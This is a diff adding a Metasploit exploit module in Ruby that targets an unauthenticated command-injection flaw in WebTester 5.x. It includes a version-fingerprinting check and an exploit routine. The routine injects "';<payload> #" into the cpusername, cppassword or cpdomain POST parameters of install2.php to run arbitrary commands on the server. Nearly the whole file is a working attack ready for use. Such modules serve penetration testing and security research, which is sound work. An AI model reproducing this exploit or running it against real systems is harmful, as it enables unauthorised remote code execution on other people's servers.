@@ -1,0 +1,106 @@
+##
+# This module requires Metasploit: http//metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+require 'msf/core'
+
+class Metasploit3 < Msf::Exploit::Remote
+  Rank = ExcellentRanking
+
+  include Msf::Exploit::Remote::HttpClient
+
+  def initialize(info={})
+    super(update_info(info,
+      'Name'           => "WebTester 5.x Command Execution",
+      'Description'    => %q{
+          This module exploits a command execution vulnerability in WebTester
+        version 5.x. The 'install2.php' file allows unauthenticated users to
+        execute arbitrary commands in the 'cpusername', 'cppassword' and
+        'cpdomain' parameters.
+      },
+      'License'        => MSF_LICENSE,
+      'Author'         =>
+        [
+          'Brendan Coles <bcoles[at]gmail.com>'  # Metasploit
+        ],
+      'References'     =>
+        [
+          ['URL'       => 'https://sourceforge.net/p/webtesteronline/bugs/3/']
+        ],
+      'Payload'        =>
+        {
+            'Space'       => 8190, # Just a big value, injection on POST variable
+            'DisableNops' => true,
+            'BadChars'   => "\x00"
+        },
+      'Arch'           => ARCH_CMD,
+      'Platform'       => 'unix',
+      'Targets'        =>
+        [
+          # Tested on WebTester v5.1.20101016
+          [ 'WebTester version 5.x', { 'auto' => true } ]
+        ],
+      'Privileged'     => false,
+      'DisclosureDate' => 'Oct 17 2013',
+      'DefaultTarget'  => 0))
+
+      register_options(
+        [
+          OptString.new('TARGETURI', [true, 'The base path to WebTester', '/webtester5/'])
+        ], self.class)
+  end
+
+  #
+  # Checks if target is running WebTester version 5.x
+  #
+  def check
+    res = send_request_raw({ 'uri' => normalize_uri(target_uri.path) })
+
+    if not res
+      print_error("#{peer} - Connection timed out")
+      return Exploit::CheckCode::Unknown
+    end
+
+    if res.body =~ /Eppler Software/
+      if res.body =~ / - v5\.1\.20101016/
+        print_status("#{peer} - Found version: 5.1.20101016")
+        return Exploit::CheckCode::Vulnerable
+      elsif res.body =~ / - v(5\.[\d\.]+)/
+        print_status("#{peer} - Found version: #{$1}")
+        return Exploit::CheckCode::Appears
+      else
+        return Exploit::CheckCode::Detected
+      end
+    else
+      return Exploit::CheckCode::Safe
+    end
+  end
+
+  def exploit
+    vuln_params = [
+      'cpusername',
+      'cppassword',
+      'cpdomain'
+    ]
+    print_status("#{peer} - Sending payload (#{payload.encoded.length} bytes)...")
+    res = send_request_cgi({
+      'method' => 'POST',
+      'uri'    => normalize_uri(target_uri.path, 'install2.php'),
+      'vars_post'  => {
+        'createdb' => 'yes',
+        'cpanel'   => 'yes',
+        "#{vuln_params.sample}" => "';#{payload.encoded} #"
+      }
+    })
+
+    if not res
+      fail_with(Failure::Unknown, "#{peer} - Request timed out")
+    elsif res.code == 200 and res.body =~ /Failed to connect to database server/
+      print_good("#{peer} - Payload sent successfully")
+    else
+      fail_with(Failure::Unknown, "#{peer} - Something went wrong")
+    end
+
+  end
+end
